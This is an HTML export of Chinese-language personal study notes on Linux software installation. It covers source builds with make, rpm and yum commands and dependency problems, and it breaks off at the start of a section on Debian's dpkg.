<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>下载、安装指令</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-default_background {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray_background {
	background: rgba(248, 248, 247, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(248, 243, 252, 1);
}
.highlight-pink_background {
	background: rgba(252, 241, 246, 1);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(248, 248, 247, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(248, 243, 252, 1);
}
.block-color-pink_background {
	background: rgba(252, 241, 246, 1);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: undefined; }
.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
.select-value-color-transparentGray { background-color: undefined; }
.select-value-color-translucentGray { background-color: undefined; }
.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="225c236c-2bd1-4b27-bddc-a1788ac20662" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://www.notion.so/icons/new-folder_gray.svg"/></div><h1 class="page-title">下载、安装指令</h1><p class="page-description"></p></header><div class="page-body"><h1 id="ecfe5cf9-f35e-4e73-a8a4-727e22bd194c" class="">一、总览</h1><h3 id="1880427e-38bb-8032-8ccf-e778d8e694db" class="">1-软件包的分类</h3><p id="d58368db-6686-40c0-b405-5e7a19dcfcfd" class="">linux的软件包分为以下4种：<div class="indented"><p id="4ffb8f3c-d505-405f-a494-f52ebaf3b780" class="">1、源码包(遵循开源思想)：<div class="indented"><p id="d7ad097e-3220-4246-bfc8-77250a40e0da" class="">make工具一步步编译安装之</p></div></p><p id="4623bcb6-2c38-4dad-a95d-abe61be4a77d" class="">2、打包好的rpm包(遵循开源思想)：<div class="indented"><p id="0fcc837f-0946-4b26-9c2b-1af513ffa6cd" class="">源码&amp;二进制包可以打包成一个rpm包，放在他们的官网。</p><p id="1880427e-38bb-807f-a784-d7a2300f38d9" class="">这种包可以被rpm等工具一键编译安装，但会遇到包依赖问题。</p></div></p><p id="1880427e-38bb-80f1-9d1b-ec6ea591e937" class="">3、在官方的yum服务器管理的包(类似一个“官方应用市场”)：<div class="indented"><p id="1be67d3b-8e90-4803-b24c-4707bb76ea76" class="">用yum等工具可以一键安装且解决包依赖问题即可，但需要一个远端的yum服务器。</p><p id="1880427e-38bb-80fd-aed7-d4bde7757861" class="">这个yum服务器一般都是官方提供并维护，就像一个“官方应用市场”一样。或者像红帽一样采用收费的yum服务器的模式。</p><p id="1880427e-38bb-80f2-8111-e3721717305c" class="">这样特别方便，但有时候可能下不到一些旧的版本的包。</p></div></p><p id="1880427e-38bb-80c7-a279-e66f571bcc8c" class="">4、官网的二进制包(多为商用)：<div class="indented"><p id="1880427e-38bb-8051-a033-d1c2e7b146ba" class="">软件开发者在官网提供一份编译好的二进制安装包，使用者直接下载，安装即可。</p></div></p></div></p><h3 id="1880427e-38bb-8048-ada7-e36246138dd4" class="">2-动态链接方式</h3><p id="b623b017-fc8d-421d-bcd5-a485aff1c428" class="">且这些软件将共享一个动态链接库，这使得：<div class="indented"><p id="faedcc9a-2046-4729-81b3-c9513086559c" class="">1、优点是节约内存空间和存储空间！</p><p id="dc05cacc-108c-4f29-9c70-b727befd2aae" class="">2、缺点是会产生一个依赖链：当你安装a的时候，它会告知a依赖于b要求安装b，安装b的时候，它会告知b依赖于c要求安装c…</p></div></p><h1 id="48f5d6c3-9bbd-4152-91cc-4b0f95c5d6ad" class="">二、安装操作</h1><h2 id="1880427e-38bb-8070-bd75-de5d4428f424" class="">（一）源码包安装</h2><ul id="735546be-8652-4216-81f4-1f5896545c63" class="toggle"><li><details open=""><summary><strong>使用make工具进行源码包的安装，具体如下：</strong></summary><p id="e61e61d4-2357-443a-b6b9-a8feef8956e5" class="">1、执行配置脚本<code>./configure</code><div class="indented"><p id="8e952d06-19b6-47ff-a7ae-073489e0d39e" class="">这里主要是检测环境是否符合（包括os环境+依赖项）以及设置程序的一些参数</p><p id="95c9dc3d-349a-4ab6-8634-7eaca45bae0b" class="">运行成功后会生成一个Makefile（其中存储了一些机械编译指令告诉系统怎么编译安装，如调用gcc并赋予什么传参、要把什么文件提取拷贝到什么地方等）</p></div></p><p id="1c733a93-c4b4-443f-880d-413d3665cabe" class="">2、运行编译命令<code>make</code><div class="indented"><p id="1c44b1fc-fadf-4e37-a287-99836fed627e" class="">该命令会去当前目录寻找Makefile，然后按照Makefile中的指令对软件进行安装</p></div></p><p id="2cdb4d6e-5a25-4296-9144-58c548280d46" class="">3、运行安装命令<code>make install</code>安装软件<div class="indented"><p id="5c300a94-c357-451a-a0e3-f048a6bb724f" class="">默认安装在user/local（也可以在执行 ./configure 时用 --prefix 选项来指定其他安装路径）</p></div></p><blockquote id="a1608d2f-3bca-4274-9358-468395b27d7c" class="">make工具的更多命令：<p id="94fd7c2d-ea76-4a85-88cc-ff017ee0dd14" class="">1、make uninstall：卸载</p><p id="ce01ebcf-3e97-44dd-9400-eca4671078b7" class="">2、make clean：清除上次编译的数据，重新编译之</p></blockquote></details></li></ul><ul id="338df783-a25a-4103-a98a-d4afb9025261" class="toggle"><li><details open=""><summary>当遇到缺少库问题时，看这里：</summary><h3 id="24a34091-58c3-4060-bf31-55141f93aa8c" class="">1、yum安装</h3><p id="a8bbde1c-d1bc-4347-a675-7bb1db7dbeb3" class="">首先，使用yum安装对应的库：</p><figure id="2c76af47-07b2-47b0-806d-db656a510552" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/Untitled.png"><img style="width:480px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/Untitled.png"/></a></figure><p id="8d278370-4306-487e-8e90-3bcf3abd0cdb" class="">对应的安装指令为：</p><p id="ab445174-cfda-41ce-a3ca-0e924af133f9" class="">sudo yum search ncurses</p><p id="f0aca27c-bacb-446d-9ead-76d6e0bb2813" class="">sudo yum install ncurses-devel</p><h3 id="3b291cd2-a8e1-4da1-a613-819668a7e53b" class="">2、什么是普通包和开发者包</h3><p id="ebf3c815-9e25-41a5-8f47-5d0dfeb69cd4" class="">就比如ncurses是普通包，而ncurses-devel是开发者包</p><p id="2e83a897-a5f1-4173-8598-c9b48b159dfb" class="">前者是一些编译好的exe文件，二后者包括了一下它的源码文件和.c文件</p><p id="2813f0ce-fd12-4ed5-a13c-3a01f40d4cc2" class="">所以加入我们在编译时遇到报错：”缺少SDL.h”，那我们应该做的是去下载SDL-devel而不是去下载SDL包</p><h3 id="1c1b08b3-d717-42fd-83b2-7f79dc1d64b6" class="">3、重新解压</h3><p id="8d2d4e6a-2cd0-481f-9a3f-f131ea434289" class="">然后，<mark class="highlight-red">必须要删除解压后的安装包，重新解压运行config→make编译一条龙！</mark></p></details></li></ul><h2 id="97776753-8889-45d1-bdff-2b4d00c8c39d" class="">（二）rpm包安装</h2><h3 id="ead337dc-5778-44ee-82c2-98c8b5cd5e14" class="">1-红帽系列</h3><ul id="c7d2167f-03d9-40a3-8715-22f28c432afe" class="toggle"><li><details open=""><summary><strong>rpm：</strong></summary><p id="8f2bf8bc-309e-491f-83cc-06d7e47d2da8" class="">【定义】</p><p id="04ba58b6-4505-4e77-9dc9-b27afd55e213" class="">红帽系列linux上的包管理工具，其主要意义是：</p><p id="bc64bcec-1dd9-46e4-9380-aaafbe1470e9" class="">1、便于用户管理所有软件：包括软件的查询、安装和卸载。</p><p id="e30e4de4-6644-46df-a1a7-71477947a1d9" class="">2、提供了一种安装包的制作格式，即rpm，以此统一了所有红帽linux的软件发布者</p><ul id="9d8bf2a4-686b-45c1-a8d2-24491b9642a3" class="toggle"><li><details open=""><summary>然鹅，其具有以下缺点：</summary><p id="cbe11538-3e6f-4d9d-b8cd-70229b99094d" class="">1、需要用户自己找到并下载rpm包</p><p id="7621c0fb-ed90-4053-92ce-badb10f3bc9f" class="">2、rpm包的依赖问题，想下a得先下b，想下b得先下c，较为繁琐</p></details></li></ul><p id="0ac5b72e-ca1d-4963-a9d1-1117f6202fec" class="">【相关指令】</p><ul id="a1d0799b-5aa5-4935-9c88-37a854d83be8" class="toggle"><li><details open=""><summary>安装、卸载：</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a1758fba-1e88-4934-8226-9069cd569cfb" class="code"><code class="language-Shell">rpm -ivh 包路径           #安装rpm包
                             #其中i表示install，v表示输出详细安装信息，h表示用哈希字符“#”来显示安装
rpm -e 包名               #卸载rpm包
											       #这里不需要加版本号等后缀，其中，e即erase</code></pre><blockquote id="cb89d970-175d-4730-b56e-73793bd2e786" class="">注意，如果包a被包b所依赖，再卸载包a时会报错该依赖关系</blockquote></details></li></ul><ul id="35c35c5e-182d-453a-9791-4a6bb6dc87f6" class="toggle"><li><details open=""><summary>查询：</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3e2c4978-a178-40e2-8af5-d657e517ba8b" class="code"><code class="language-Shell">rpm -qa | grep -i 关键字   #模糊搜索获得已安装软件包名
															#其中，i表示忽略大小写（ignore），qa表示显示所有软件包名
rpm -qi 包名               #显示已安装软件包的详细信息
															#加p改路径变成显示软件包文件的详细信息</code></pre><p id="15d218a3-bfd4-4229-a84f-d8f3f43afcf1" class="">不常用：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="875d58e0-427c-45ad-bb32-f9c475b65306" class="code"><code class="language-Shell">rpm -qpl 软件包路径        #查看软件包里包含哪些文件
															#其中：q是查询，p是指定软件包路径，l是查看其路径的选项
															#注意，这里查到是安装该rpm包时会向Linux文件系统复制的文件列表，文件的路径代表实际对应文件的安装目录
rpm -qR                   #显示软件包的依赖信息
rpm -qf 文件路径           #查询系统中某一文件来自哪个rpm包（不小心改错文件时，可以用这个命令查询其对应rpm包，然后重装之）</code></pre></details></li></ul><p id="b791981f-6eac-40e9-9c1f-60ea420d915f" class="">【解决依赖性问题】</p><p id="535326eb-0917-41be-8573-2e25de2481ec" class="">一个方案是，当其报错说依赖a、b、c包时，用yum依次安装这些被依赖的包</p><p id="229beb5e-c6c2-4784-9ab9-9cd3606314ab" class="">另一个方案更简单，直接用yum安装这个出现依赖问题的rpm包：yum install xxx.rpm</p></details></li></ul><ul id="79686678-af5c-44d4-be6a-c7e269d91a16" class="toggle"><li><details open=""><summary><strong>rpm包：</strong></summary><p id="f7932ec1-3761-4915-be9f-b7425803c119" class="">【定义】</p><p id="95bd9db0-2232-4e9f-842a-4c69f9453157" class="">红帽系列linux要求软件发行者把他们的二进制安装文件以rpm格式打包，以便于统一用rpm包管理工具对其进行安装</p><blockquote id="156be6f6-e3d4-4745-9618-94b8bb9374f4" class="">实际上，开发者也可以直接将源码打包在rpm包中，然后在rpm运行的时候执行安装文件中内置的gcc指令序列进行编译</blockquote><p id="c5b51f8e-3132-4b7b-b185-c2f8e45a20b6" class="">【如何找rpm包】</p><p id="4af9e07c-f18a-4bea-8b47-e236af7dda40" class="">1、可以给当前红帽系统装一个Redhat光盘，光盘里面有许多的rpm包</p><p id="f87a7c57-de93-4a07-93d1-64c7a3b1560c" class="">2、可以在linux发行版的网站上搜索到安装url，然后<code>wgets 安装url</code></p><blockquote id="df9253e2-e95c-4a02-9a67-36a252e8a9a4" class="">wget即web get，是用来在web上下载文件的工具</blockquote><p id="01d3e7f7-29c3-4444-9411-dc042b5b6f09" class="">【rpm包的格式】</p><p id="9f316314-8bc7-4b17-8a07-75553665221c" class="">其文件名命名规范为：<code>“软件名-软件版本-红帽版本-指令集架构”</code></p></details></li></ul><h3 id="fd26011a-bd3e-46c8-9c0c-6bef7fe3d899" class="">2-Debian系列</h3><ul id="589d0740-7cef-4fbc-8116-85b5a18627af" class="toggle"><li><details open=""><summary><strong>dpkg：</strong></summary><p id="907e5c61-4569-4f4e-9ffd-74e5e5dbf865" class="">【定义】</p><p id="144d1e53-f5ff-474c-8982-d84120208486" class="">Debian系列linux的包管理工具，类似于rpm</p><p id="0f574420-2a04-4d8e-aef3-323977006cfe" class="">【相关指令】</p><ul id="9dc18316-d79d-4be4-8ae3-2c72f63bac23" class="toggle"><li><details open=""><summary>安装、卸载：</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 